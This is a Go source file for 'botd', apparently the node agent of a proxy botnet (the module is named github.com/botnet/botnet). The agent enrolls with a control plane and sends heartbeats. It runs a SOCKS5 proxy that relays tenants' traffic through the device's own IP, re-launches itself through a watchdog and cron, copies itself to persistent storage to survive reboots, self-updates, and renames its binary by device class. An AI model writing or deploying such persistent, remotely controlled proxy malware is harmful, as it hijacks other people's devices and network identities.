// botd — agente unificado: agente+SOCKS5+watchdog (reexec), BLUEPRINT parrafo 4
// Arranque por estados (T-0301): node.json valido → modo agente; si no,
// enrolado con POST /v1/enroll contra el stub. El presupuesto del
// runtime (GOMEMLIMIT/GOGC/GOMAXPROCS) se aplica siempre, en ambos
// modos; --print-env lo hace visible.
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/botnet/botnet/internal/agent"
	"github.com/botnet/botnet/internal/config"
	"github.com/botnet/botnet/internal/logx"
	"github.com/botnet/botnet/internal/proxy"
	"github.com/botnet/botnet/internal/state"
	"github.com/botnet/botnet/internal/watchdog"
)

// version se pisa en build con -ldflags "-X main.version=v..."; F1 fija
// la puerta ./botd --version → v0.1.0.
var version = "v0.1.0"

// name y classTag se pisan por clase en build con
// -ldflags "-X main.name=<rename del perfil> -X main.classTag=class-<A|B|C>"
// (T-1305, A1-08): el binario de clase C no se llama como el de A, y la
// etiqueta embebida es lo que `strings`/`grep -a` aserta en el bundle.
var name = "botd"
var classTag = "class-A"

func main() {
	var (
		showVer      bool
		printEnv     bool
		printRoot    bool
		buildLabel   bool
		cfgPath      string
		nodeDirOv    string
		socks5Addr   string
		sourceIP     string
		socks5Direct bool
		metricsAddr  string
		runFor       time.Duration
		asParent     bool
		asChild      bool
		asGuard      bool
		stage        bool
		smokeMode    bool
		stubURL      string
		doCommit     bool
	)
	flag.StringVar(&cfgPath, "config", "", "path to JSON config file")
	flag.StringVar(&nodeDirOv, "node-dir", "", "override node_dir (estado plano del agente)")
	flag.StringVar(&socks5Addr, "socks5-addr", proxy.DefaultSOCKSAddr, "loopback del SOCKS5 embebido; vacio = proxy off (EP-06)")
	flag.StringVar(&sourceIP, "source-ip", os.Getenv("BOTNET_SOURCE_IP"), "IP local con la que el nodo sale a la red (alta, latido y SOCKS5); vacio = la del kernel (T-2102)")
	flag.BoolVar(&socks5Direct, "socks5-direct", false, "sin tunel H2 el proxy del nodo marca el destino desde su -source-ip (flota de laboratorio; en produccion abre internal/tunnel)")
	flag.StringVar(&metricsAddr, "metrics-addr", "", "servir /metrics del agente aqui: botnet_tenant_count (EP-06; vacio = off)")
	flag.BoolVar(&showVer, "version", false, "print version and exit")
	flag.BoolVar(&printEnv, "print-env", false, "print runtime budget env and exit")
	flag.BoolVar(&printRoot, "print-root", false, "print update root pubkey (base64) pinned en build y salir (T-1403)")
	flag.BoolVar(&buildLabel, "build-label", false, "print embedded class label and exit (T-1305)")
	flag.DurationVar(&runFor, "run-for", 0, "exit after this duration (0 = until signal); soak y tests")
	flag.BoolVar(&asParent, "parent", false, "rol watchdog: vigila y relanza al hijo (T-0501)")
	flag.BoolVar(&asChild, "child", false, "rol vigilado: lo lanza el padre por reexec (T-0501)")
	flag.BoolVar(&asGuard, "guard", false, "un-shot de cron: relanza al padre si el pidfile no responde (T-0503)")
	flag.BoolVar(&smokeMode, "smoke", false, "humo de arquitectura (T-1402): enroll+heartbeat contra --stub y salir")
	flag.StringVar(&stubURL, "stub", "", "URL del stub del plano de control para --smoke")
	flag.BoolVar(&stage, "stage", false, "arranque de clase C: deja copia en la persistencia declarada antes de correr (T-0206)")
	flag.BoolVar(&doCommit, "commit", false, "aplicar el self-update pendiente antes de arrancar: fijar stable_version y relanzar el slot comprometido (T-1404)")
	flag.Parse()

	if showVer {
		fmt.Println(version)
		return
	}
	if printRoot {
		// La raiz ed25519 se fija en build con
		// -X internal/agent.RootPubKeyBase64; vacio = binario sin raiz.
		fmt.Println(agent.PrintRoot())
		return
	}
	if smokeMode {
		if err := runSmoke(stubURL); err != nil {
			fmt.Fprintln(os.Stderr, "smoke:", err)
			os.Exit(1)
		}
		return
	}
	if buildLabel {
		fmt.Printf("%s %s\n", classTag, name)
		return
	}
	cfg, err := config.Load(cfgPath)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	snap := agent.ApplyRuntimeBudget()
	if printEnv {
		for _, line := range snap.Lines() {
			fmt.Println(line)
		}
		return
	}

	nodeDir := cfg.NodeDir
	if nodeDirOv != "" {
		nodeDir = nodeDirOv
	}
	opts := agentOpts{
		socks5Addr: socks5Addr, metricsAddr: metricsAddr,
		sourceIP: sourceIP, directDial: socks5Direct,
	}
	log := logx.New("info")
	if stage {
		// T-0206 AC2: en clase C el binario vive en tmpfs y no sobrevive
		// al reboot; el arranque con --stage deja copia en la persistencia
		// declarada para que el guard de @reboot la recupere.
		if err := stageSelf(nodeDir, log); err != nil {
			log.Error("stage", "err", err)
		}
	}
	log.Info("persist", "mode", watchdog.PersistMode(nil)) // T-0504 AC3: persist=systemd|rc|reboot
	// T-1404 AC1: a --commit run applies the pending self-update BEFORE
	// any role starts and before the pidfile is taken, so the slot
	// binary it relaunches can acquire the flock cleanly.
	if doCommit {
		if err := commitUpdate(nodeDir, version, log); err != nil {
			log.Error("update=commit", "err", err)
		}
	}
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	if runFor > 0 {
		ctx, stop = context.WithTimeout(ctx, runFor)
		defer stop()
	}
	pidfile := watchdogPidfile(nodeDir)

	// Roles del mismo binario (T-0501/T-0503): --parent supervisa,
	// --child es el agente vigilado, --guard es el un-shot de cron y
	// `botd optout` borra la linea de cron sin root.
	if arg := flag.Arg(0); arg == "optout" {
		left, err := watchdog.OptoutCron(watchdog.SystemCron{})
		if err != nil {
			log.Error("optout", "err", err)
			os.Exit(1)
		}
		fmt.Println("crontab lines:", left)
		return
	}
	if asGuard {
		_, err := watchdog.RunGuardOnce(watchdog.GuardConfig{PidfilePath: pidfile, Log: log})
		switch {
		case err == nil:
			log.Info("guard: padre relanzado")
		case errors.Is(err, watchdog.ErrHealthy):
			log.Info("guard: pidfile responde, no actuo")
		default:
			log.Error("guard", "err", err)
			os.Exit(1)
		}
		return
	}
	if asParent {
		err := watchdog.RunParent(ctx, watchdog.ParentConfig{
			PidfilePath: pidfile,
			Spawn:       watchdog.DefaultSpawn(watchdog.ChildFlag),
			Log:         log,
		})
		if errors.Is(err, watchdog.ErrRestartRequested) {
			restartWithCommit(log, runFor) // never returns
		}
		if err != nil {
			log.Error("watchdog parent", "err", err)
			os.Exit(1) // incluye ErrDouble: segundo arranque con flock tomado
		}
		return
	}
	if asChild {
		err := watchdog.RunChild(ctx, watchdog.ChildConfig{
			Work:        agentWork(log, cfg, nodeDir, version, opts),
			PidfilePath: pidfile,
			Log:         log,
		})
		if errors.Is(err, watchdog.ErrRestartRequested) {
			restartWithCommit(log, runFor) // never returns
		}
		if err != nil {
			log.Error("watchdog child", "err", err)
			os.Exit(1)
		}
		return
	}
	if err := agentWork(log, cfg, nodeDir, version, opts)(ctx); err != nil {
		log.Error("agente", "err", err)
		os.Exit(1)
	}
}

// watchdogPidfile: el pidfile canonico vive en node_dir (/data/botd/
// botd.pid, T-0501 AC3).
func watchdogPidfile(nodeDir string) string {
	return filepath.Join(nodeDir, watchdog.PidfileName)
}

// RestartMarkerEnv points at a marker file the watched child must
// consume on boot: while the marker exists, agentWork exits with
// agent.ExitNeedRestart (75) — exactly what a child that has just
// staged a self-update does — so e2e tests drive the real
// exit-75 -> parent restart -> --commit chain without dobles.
const RestartMarkerEnv = "BOTNET_RESTART_FILE"

// restartWithCommit is the parent's answer to watchdog.ErrRestartRequested:
// re-exec the same binary with ParentFlag+CommitFlag and exit with the
// restarted process' code (T-1404 AC1). It never returns on success.
func restartWithCommit(log *slog.Logger, runFor time.Duration) {
	exe, err := watchdog.SameBinary()
	if err == nil {
		var args []string
		args, err = watchdog.ReexecArgs(watchdog.ParentFlag, watchdog.CommitFlag)
		if err == nil && runFor > 0 {
			// The lifetime clock belongs to the parent and must survive
			// its own restart: ReexecArgs strips -run-for for children,
			// so it is re-appended here for the parent's re-exec.
			args = append(args, "-run-for", runFor.String())
		}
		if err == nil {
			err = execBinary(exe, args)
		}
	}
	log.Error("parent restart with commit", "err", err)
	os.Exit(1)
}

// execBinary replaces this process with path+args: syscall.Exec on Unix;
// on Windows syscall.Exec is unimplemented, so it follows the watchdog
// re-exec pattern — spawn the same-binary process with inherited stdio
// and exit with its code. It never returns on success.
func execBinary(path string, args []string) error {
	if runtime.GOOS != "windows" {
		if err := syscall.Exec(path, append([]string{path}, args...), os.Environ()); err != nil {
			return fmt.Errorf("exec %s: %w", path, err)
		}
		return nil // only if Exec lies; treat as failure downstream
	}
	cmd := exec.Command(path, args...)
	cmd.Env = os.Environ()
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		var ee *exec.ExitError
		if errors.As(err, &ee) {
			os.Exit(ee.ExitCode())
		}
		return fmt.Errorf("re-exec %s: %w", path, err)
	}
	os.Exit(0)
	return nil
}

// commitUpdate applies the pending self-update: Updater.Commit pins the
// stable version — the one the update flow left in stable_version,
// falling back to the running version when nothing was pinned — and,
// when that version differs from the one running, relaunches the binary
// living in the committed slot: botdA/botdB behind the slot pointer in
// class A, node_dir/botd in B/C (T-1404 AC1: un update descargado se
// activa al fin). The relaunch replaces this process, so the pidfile is
// still free for the slot binary.
func commitUpdate(nodeDir, ver string, log *slog.Logger) error {
	class := string(agent.DeviceClassForArch(agent.ArchFromRuntime()))
	up := agent.NewUpdater(nodeDir, class)
	if up == nil {
		return fmt.Errorf("update=commit: clase invalida para %s", agent.ArchFromRuntime())
	}
	stable := up.StableVersion()
	if stable == "" {
		stable = ver
	}
	if err := up.Commit(stable); err != nil {
		return err
	}
	log.Info("update=commit", "version", stable)
	if stable == ver {
		return nil
	}
	slot := committedSlotBinary(nodeDir, class)
	if slot == "" {
		return nil
	}
	if self, err := os.Executable(); err == nil && filepath.Clean(slot) != filepath.Clean(self) {
		log.Info("update=slot_relaunch", "exe", slot, "version", stable)
		return execBinary(slot, commitFreeArgs())
	}
	return nil
}

// committedSlotBinary resolves the binary of the committed slot: class A
// follows the slot pointer file (botdA/botdB), classes B/C use the
// rename-in-place active path node_dir/botd. A ".exe" variant is tried
// too for Windows hosts, where Stage's copy carries the extension. An
// empty string means no committed slot binary exists yet.
func committedSlotBinary(nodeDir, class string) string {
	name := "botd"
	if class == "A" {
		letter := "A"
		if raw, err := os.ReadFile(filepath.Join(nodeDir, "slot")); err == nil {
			if strings.TrimSpace(string(raw)) == "B" {
				letter = "B"
			}
		}
		name = "botd" + letter
	}
	for _, cand := range []string{filepath.Join(nodeDir, name), filepath.Join(nodeDir, name+".exe")} {
		if fi, err := os.Stat(cand); err == nil && !fi.IsDir() {
			return cand
		}
	}
	return ""
}

// commitFreeArgs returns os.Args minus the --commit flag: the slot
// binary continues the inherited run (role, config, clock) without
// committing again, so the relaunch cannot recurse.
func commitFreeArgs() []string {
	out := make([]string, 0, len(os.Args)-1)
	for _, a := range os.Args[1:] {
		if len(a) > 1 && a[0] == '-' && strings.TrimLeft(a, "-") == "commit" {
			continue
		}
		out = append(out, a)
	}
	return out
}

// stageSelf deja copia del binario en la persistencia declarada
// (<node_dir>/persist/<name>): en clase C el ejecutable vive en tmpfs y
// no sobrevive al reboot, y el guard de @reboot re-copia desde ahi
// (T-0206 AC2, docs/runbooks/intrusion.md §5). Copia idempotente.
func stageSelf(nodeDir string, log *slog.Logger) error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	dst := filepath.Join(nodeDir, "persist", filepath.Base(exe))
	dir := filepath.Dir(dst)
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return err
	}
	if fi, err := os.Stat(dst); err == nil {
		if si, err := os.Stat(exe); err == nil && fi.Size() == si.Size() {
			log.Info("stage", "dest", dst, "copied", false)
			return nil
		}
	}
	in, err := os.Open(exe)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o700)
	if err != nil {
		return err
	}
	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		return err
	}
	if err := out.Close(); err != nil {
		return err
	}
	log.Info("stage", "dest", dst, "copied", true)
	return nil
}

// agentOpts agrupa los ajustes de arranque que cambian cuando hay varias
// instancias del agente en la misma maquina (T-2102: la flota de
// laboratorio del VPS, un botd por nodo con su propio 127.0.0.x).
type agentOpts struct {
	socks5Addr  string // direccion del SOCKS5 embebido; vacio = proxy off
	metricsAddr string // /metrics del agente; vacio = off
	sourceIP    string // IP local de salida del nodo (alta, latido, SOCKS5)
	directDial  bool   // marcar el destino sin tunel H2 (ver startProxy)
}

// agentWork es el payload del rol hijo (y del arranque directo
// historico): node.json valido → agente; si no, enrolado. Devuelve el
// error para que el watchdog lo trate como muerte del hijo.
func agentWork(log *slog.Logger, cfg config.Config, nodeDir, ver string, opts agentOpts) func(context.Context) error {
	return func(ctx context.Context) error {
		// T-1404 AC1 chain hook: when BOTNET_RESTART_FILE names a live
		// marker, this boot exits with ExitNeedRestart (75) and consumes
		// the marker — precisely what the child does right after staging
		// a self-update — so the parent takes the restart path for real.
		if f := os.Getenv(RestartMarkerEnv); f != "" {
			if err := os.Remove(f); err == nil {
				log.Info("update=need_restart", "marker", f, "exit", agent.ExitNeedRestart)
				os.Exit(agent.ExitNeedRestart)
			}
		}
		machine := state.New()
		id, err := agent.LoadNodeIdentity(nodeDir)
		if err != nil {
			// Enrolado: sin node.json valido, ceremonial POST /v1/enroll.
			log.Info("botd start", "mode", "enroll", "dir", nodeDir)
			id, err = runEnroll(ctx, log, cfg, nodeDir, opts.sourceIP)
			if err != nil {
				return err
			}
			if err := machine.Transition(state.Agent); err != nil {
				return err
			}
		} else {
			log.Info("botd start", "mode", "agent", "slug", id.Slug)
			_ = machine.Transition(state.Agent)
		}
		return runAgent(ctx, log, cfg, id, machine, ver, nodeDir, opts)
	}
}

// runEnroll completa el alta contra cfg.Endpoint. El device_token y el
// ticket los dejo el probe (EP-02) en el estado o por entorno; un 409
// idempotente se resuelve re-emitiendo certificado: log reenroll=ok sin
// fila nueva (T-0308). sourceIP ata el socket del alta a la IP propia del
// nodo, que es lo que el backend anota en nodes.public_ip (A1-04).
func runEnroll(ctx context.Context, log *slog.Logger, cfg config.Config, nodeDir, sourceIP string) (agent.NodeIdentity, error) {
	stateDir, err := agent.EnsureStateDir(nodeDir)
	if err != nil {
		return agent.NodeIdentity{}, err
	}
	token := agent.ReadTokenOrEnv(stateDir)
	if token == "" {
		return agent.NodeIdentity{}, fmt.Errorf("%s: sin device_token (estado o BOTNET_DEVICE_TOKEN)", name)
	}
	ec := agent.EnrollConfig{
		Endpoint: cfg.Endpoint, DeviceToken: token, Ticket: agent.ReadTicket(stateDir),
		Arch: agent.ArchFromRuntime(), AgentVer: version,
		NodeDir: nodeDir, StateDir: stateDir,
		HTTP: agent.SourceIPClient(sourceIP),
	}
	out, err := agent.Enroll(ctx, &ec)
	if err != nil {
		return agent.NodeIdentity{}, err
	}
	if out.Reenrolled {
		log.Info("reenroll=ok", "node_id", out.Resp.NodeID, "fingerprint", out.Fingerprint)
	} else {
		log.Info("enroll=ok", "node_id", out.Resp.NodeID, "slug", out.Resp.Slug)
	}
	id, err := agent.LoadNodeIdentity(nodeDir)
	if err != nil && out.Reenrolled && out.Resp.NodeID != "" {
		// 409 minimo (reset de fabrica): el backend mando {error,node_id}
		// y node.json no existe — la identidad sigue viva en el outcome.
		return agent.NodeIdentity{NodeID: out.Resp.NodeID, Arch: ec.Arch, AgentVer: version, EnrolledAt: time.Now().UTC()}, nil
	}
	return id, err
}

// runAgent es el bucle del modo agente: heartbeat con cadencia servida,
// entitlements en caliente y supervisor in-process. El proxy SOCKS5
// embebido (EP-06) arranca aqui en loopback; sin el tag socks5 el binario
// informa socks5=off y el plano de control sigue vivo.
func runAgent(ctx context.Context, log *slog.Logger, cfg config.Config, id agent.NodeIdentity, machine *state.Machine, ver, nodeDir string, opts agentOpts) error {
	nodeID, err := agent.ParseUUID(id.NodeID)
	if err != nil {
		log.Error("node_id en node.json", "err", err)
		return err
	}
	// La admision del proxy es la que mide la densidad del destino: el
	// gauge botnet_tenant_count del /metrics del agente sale de aqui
	// (EP-06 T-0606 AC3).
	adm := proxy.NewAdmission(0)
	if ps := startProxy(log, nodeDir, adm, opts); ps != nil {
		defer ps.Close()
	}
	if opts.metricsAddr != "" {
		stopMetrics := startMetrics(log, opts.metricsAddr, adm)
		defer stopMetrics()
	}
	class := agent.DeviceClassForArch(id.Arch)
	mgr := agent.NewEntitlementManager(class, agent.Entitlements{})
	deps := agent.AgentDeps{
		Log:     log,
		Machine: machine,
		// El latido sale por la misma IP que el alta: MarkLive(c.IP()) no
		// puede anotar una direccion distinta de la del alta (A1-04).
		Client:    &agent.HeartbeatClient{Endpoint: cfg.Endpoint, NodeID: nodeID, AgentVer: ver, HTTP: agent.SourceIPClient(opts.sourceIP)},
		Manager:   mgr,
		Sup:       agent.NewSupervisor(log),
		IntervalS: cfg.IntervalS,
		// T-1404 AC2: el update descargado se fija tras latidos sanos con
		// trafico real (H2). Sin esta deps el commit moria en los tests.
		Commit:  agent.NewCommitTimer(0, nil),
		Updater: agent.NewUpdater(nodeDir, string(rune(class))),
		Version: ver,
		Streams: func() int { return adm.TenantCount() },
	}
	return agent.RunAgentLoop(ctx, deps)
}

// startProxy arranca el SOCKS5 embebido del nodo (EP-06). El tunel H2
// (internal/tunnel, EP-04) abre los streams: mientras no existe, el
// opener devuelve ErrNoTunnel y cada CONNECT cae a "host unreachable"
// interno sin tumbar el listener. Con -socks5-direct el propio nodo marca
// el destino desde su -source-ip: es la via de la flota de laboratorio de
// T-2102 (veinte agentes en una maquina, uno por 127.0.0.x), donde no hay
// tunel que valga y la IP de salida tiene que ser la del nodo. Devuelve nil
// si el proxy no puede o no debe vivir en este build; nunca aborta el
// agente.
func startProxy(log *slog.Logger, nodeDir string, adm *proxy.Admission, opts agentOpts) *proxy.Server {
	if opts.socks5Addr == "" {
		log.Info("proxy socks5=off", "motivo", "-socks5-addr vacio")
		return nil
	}
	stateDir, err := agent.EnsureStateDir(nodeDir)
	if err != nil {
		log.Warn("proxy socks5=off", "motivo", "estado del nodo", "err", err)
		return nil
	}
	secret, _ := agent.LoadSecret(stateDir) // sin alta aun no hay secreto: el proxy arranca y rechaza auth
	opener := proxy.OpenerFunc(func(context.Context, proxy.StreamMeta) (io.ReadWriteCloser, error) {
		return nil, proxy.ErrNoTunnel
	})
	if opts.directDial {
		opener = proxy.OpenerFunc(dialDirectFrom(opts.sourceIP))
	}
	ps, err := proxy.Start(proxy.Config{
		Addr: opts.socks5Addr, Secret: secret, Opener: opener, Log: log,
		Table: proxy.NewStreamTable(0), Sup: proxy.NewPanicBudget(),
		Adm: adm, TenantQuota: 8,
		Reg: proxy.NewRegistry(nil), CountersTable: proxy.NewCounterTable(),
	})
	switch {
	case errors.Is(err, proxy.ErrDisabled):
		log.Info("proxy socks5=off", "motivo", "build sin tags socks5,tcp")
		return nil
	case err != nil:
		log.Warn("proxy socks5=no arranco", "err", err)
		return nil
	default:
		log.Info("proxy socks5=on", "addr", ps.Addr(), "loopback_only", true)
		return ps
	}
}

// dialDirectFrom es el opener de -socks5-direct: el propio nodo abre el
// TCP contra el destino que pidio el cliente SOCKS5, atando el socket a su
// -source-ip. Asi la IP que el destino observa es la del nodo, que es justo
// lo que contrasta recruit_socks5_checks.ip_match (T-2102). sourceIP vacio
// = la que elija el kernel.
func dialDirectFrom(sourceIP string) func(context.Context, proxy.StreamMeta) (io.ReadWriteCloser, error) {
	d := &net.Dialer{Timeout: 5 * time.Second}
	if ip := net.ParseIP(sourceIP); ip != nil {
		d.LocalAddr = &net.TCPAddr{IP: ip}
	}
	return func(ctx context.Context, m proxy.StreamMeta) (io.ReadWriteCloser, error) {
		return d.DialContext(ctx, "tcp", m.Target())
	}
}

// startMetrics monta el /metrics del agente (GET /metrics con el gauge
// botnet_tenant_count de la admision, EP-06). Devuelve el apagado para
// el llamador; el servidor aguanta 1 s de drenaje.
func startMetrics(log *slog.Logger, addr string, adm *proxy.Admission) func() {
	mux := http.NewServeMux()
	mux.Handle("/metrics", adm.MetricsHandler())
	srv := &http.Server{Addr: addr, Handler: mux, ReadHeaderTimeout: 2 * time.Second}
	go func() {
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("metrics", "addr", addr, "err", err)
		}
	}()
	log.Info("agent /metrics", "addr", addr)
	return func() {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		_ = srv.Shutdown(ctx)
	}
}

// runSmoke es el humo de arquitectura de T-1402: bajo emulación demuestra
// que el ELF arranca, enrola (201 con contrato completo) y late (200 ok)
// contra el stub del plano de control. Imprime los marcadores que
// scripts/qemu/smoke.sh aserta.
func runSmoke(stub string) error {
	stub = strings.TrimRight(stub, "/")
	if stub == "" {
		return errors.New("--smoke exige --stub URL")
	}
	body := fmt.Sprintf(`{"arch":%q,"model":"smoke","firmware":"n/a","mac":"02:00:00:00:00:00"}`, runtime.GOARCH)
	req, err := http.NewRequest(http.MethodPost, stub+"/v1/enroll", bytes.NewReader([]byte(body)))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Device-Token", "smoke-token")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusCreated {
		return fmt.Errorf("enroll status %d, want 201", resp.StatusCode)
	}
	var er struct {
		NodeID     string   `json:"node_id"`
		Slug       string   `json:"slug"`
		NodeSecret string   `json:"node_secret"`
		Rendezvous []string `json:"rendezvous"`
		TTLS       int      `json:"ttl_s"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&er); err != nil {
		return fmt.Errorf("201 ilegible: %w", err)
	}
	if er.NodeID == "" || er.Slug == "" || er.NodeSecret == "" || len(er.Rendezvous) == 0 || er.TTLS <= 0 {
		return errors.New("201 sin node_id/slug/node_secret/rendezvous/ttl_s (contrato roto)")
	}
	fmt.Println("ENROLL 201 node_id=" + er.NodeID + " slug=" + er.Slug)

	hb := fmt.Sprintf(`{"node_id":%q,"rss_kib":1024,"streams":0,"ver":%q,"bytes_delta":0}`, er.NodeID, version)
	hbReq, err := http.NewRequest(http.MethodPost, stub+"/v1/heartbeat", bytes.NewReader([]byte(hb)))
	if err != nil {
		return err
	}
	hbReq.Header.Set("Content-Type", "application/json")
	hbResp, err := http.DefaultClient.Do(hbReq)
	if err != nil {
		return err
	}
	defer hbResp.Body.Close()
	hbBody, _ := io.ReadAll(hbResp.Body)
	if hbResp.StatusCode != http.StatusOK || string(hbBody) != "ok" {
		return fmt.Errorf("heartbeat %d %q, want 200 ok", hbResp.StatusCode, hbBody)
	}
	fmt.Println("HEARTBEAT 200 ok")
	return nil
}
